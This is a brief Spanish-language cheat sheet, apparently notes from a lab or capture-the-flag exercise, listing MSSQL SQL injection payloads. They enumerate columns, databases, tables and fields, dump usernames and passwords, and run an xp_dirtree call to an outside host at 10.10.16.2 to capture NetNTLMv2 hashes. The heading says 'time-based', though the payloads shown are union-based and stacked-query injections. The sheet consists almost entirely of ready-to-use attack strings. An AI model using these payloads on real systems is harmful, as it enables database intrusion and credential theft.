# time-based

# Time-based

## MSSQL

### Enumeración de columnas

```
test'union+select+1,2,3,4,5,6--+-
```

## Enumeración de bases de datos

```
test'union+select+1,name,3,4,5,6+FROM+master..sysdatabases--+-
```

## Extracción de tablas

```
test'union+select+1,name,3,4,5,6+FROM+STREAMIO..sysobjects+WHERE+xtype+%3d+'U'--+-
```

## Extracción de columnas

```
test'union+select+1,name,3,4,5,6+FROM+syscolumns+WHERE+id+%3d+(SELECT+id+FROM+sysobjects+WHERE+name+%3d+'users')--+-
```

## Dumpeo de datos

```
test'union+select+1,concat(username,':',password),3,4,5,6+FROM+users--+-
```

## Obtenciónd de hash NetNTLMv2

```
'; use master; exec xp_dirtree '\\10.10.16.2\shared';--
```